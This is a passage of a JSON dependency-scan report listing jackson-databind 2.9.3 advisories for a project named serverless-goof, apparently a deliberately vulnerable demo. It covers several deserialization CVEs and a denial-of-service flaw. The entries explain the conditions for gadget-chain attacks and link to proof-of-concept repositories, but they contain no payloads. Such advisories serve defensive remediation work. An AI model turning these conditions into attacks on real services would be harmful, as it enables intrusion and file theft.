        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:R",
      "alternativeIds": [],
      "creationTime": "2019-05-19T10:19:10.287403Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. When Default Typing is enabled for an externally exposed JSON endpoint, the service has the mysql-connector-java jar in the classpath. An attacker can host a crafted MySQL server reachable by the victim and send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs due to missing `com.mysql.cj.jdbc.admin.MiniAdmin` validation.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9, 2.8.11.4, 2.7.9.6, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/dda513bd7251b4f32b7b60b1c13740e3b5a43024)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2326)\n- [Github Release Tag](https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.9)\n- [PoC](https://github.com/Al1ex/CVE-2019-12086)\n",
      "disclosureTime": "2019-05-17T18:12:58Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.9)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.9",
        "2.8.11.4",
        "2.7.9.6",
        "2.6.7.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-174736",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-5ww9-j83m-q7qx"
        ],
        "CVE": [
          "CVE-2019-12086"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:54:55.518177Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-05-17T18:12:58Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/dda513bd7251b4f32b7b60b1c13740e3b5a43024"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2326"
        },
        {
          "title": "Github Release Tag",
          "url": "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.9"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2019-12086"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.9)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9)",
          "[2.8.0,2.8.11.4)",
          "[2.7.0,2.7.9.6)",
          "[,2.6.7.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.9"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2022-03-11T13:26:43.073121Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) via a large depth of nested objects.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.12.6.1, 2.13.2.1 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2816)\n- [GitHub PR](https://github.com/FasterXML/jackson-databind/pull/3416)\n",
      "disclosureTime": "2022-03-11T13:18:25Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "2.12.6.1",
        "2.13.2.1"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-2421244",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "CVE": [
          "CVE-2020-36518"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-04-01T09:33:51.425400Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-11T14:24:04Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/fcfc4998ec23f0b1f7f8a9521c2b317b6c25892b"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2816"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/FasterXML/jackson-databind/pull/3416"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[, 2.12.6.1)",
          "[2.13.0, 2.13.2.1)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.12.6.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-01-11T11:41:28.547000Z",
      "credit": [
        "Imre Rad"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)). This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.8.11, 2.9.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1855)\n- [PoC Project](https://github.com/irsl/jackson-rce-via-spel/)\n",
      "disclosureTime": "2018-01-10T11:41:28Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.8.11",
        "2.9.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32043",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2017-17485"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:58:05.283948Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-01-22T12:30:55Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1855"
        },
        {
          "title": "PoC Project",
          "url": "https://github.com/irsl/jackson-rce-via-spel/"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.8.11)",
          "[2.9.0,2.9.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2018-01-22T15:40:18.105000Z",
      "credit": [
        "Rui Chong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) and [CVE-2017-17485](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-32043)). This is exploitable via two different gadgets that bypass a blacklist.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.8.11, 2.9.4 or higher.\n## References\n- [GitHub Commit](https://github.com/GulajavaMinistudio/jackson-databind/pull/92/commits/038b471e2efde2e8f96b4e0be958d3e5a1ff1d05)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1899)\n",
      "disclosureTime": "2018-01-18T15:40:18Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.8.11",
        "2.9.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32044",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-w3f4-3q6j-rh82"
        ],
        "CVE": [
          "CVE-2018-5968"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T16:03:51.361638Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-01-23T13:17:24Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/GulajavaMinistudio/jackson-databind/pull/92/commits/038b471e2efde2e8f96b4e0be958d3e5a1ff1d05"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1899"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.8.11)",
          "[2.9.0,2.9.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2018-02-26T15:13:40.723000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the `c3p0` libraries are available in the classpath.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.5, 2.8.11.1, 2.9.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/6799f8f10cc78e9af6d443ed6982d00a13f2e7d2)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1931)\n",
      "disclosureTime": "2018-02-10T15:13:40Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.1)",
            "[2.9.0,2.9.5)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.5",
        "2.8.11.1",
        "2.9.5"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32111",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cggj-fvv3-cqwv"
        ],
        "CVE": [
          "CVE-2018-7489"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:58:50.080780Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-02-26T15:13:40Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/6799f8f10cc78e9af6d443ed6982d00a13f2e7d2"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1931"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.1)",
            "[2.9.0,2.9.5)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.5)",
          "[2.7.0, 2.8.11.1)",
          "[2.9.0, 2.9.5)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2019-06-19T15:28:46.421239Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x through 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has JDOM 1.x or 2.x jar in the classpath, an attacker can send a specifically crafted JSON message that allows them to read arbitrary local files on the server.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9.1, 2.8.11.4, 2.7.9.6 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/5f7c69bba07a7155adde130d9dee2e54a54f1fa5)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2341)\n- [PoC Repository](https://github.com/Al1ex/CVE-2019-12814)\n",
      "disclosureTime": "2019-06-19T14:34:16Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.9.1",
        "2.8.11.4",
        "2.7.9.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450207",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cmfg-87vq-g5g4"
        ],
        "CVE": [
          "CVE-2019-12814"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:54:24.955852Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-06-19T14:34:16Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/5f7c69bba07a7155adde130d9dee2e54a54f1fa5"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2341"
        },
        {
          "title": "PoC Repository",
          "url": "https://github.com/Al1ex/CVE-2019-12814"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
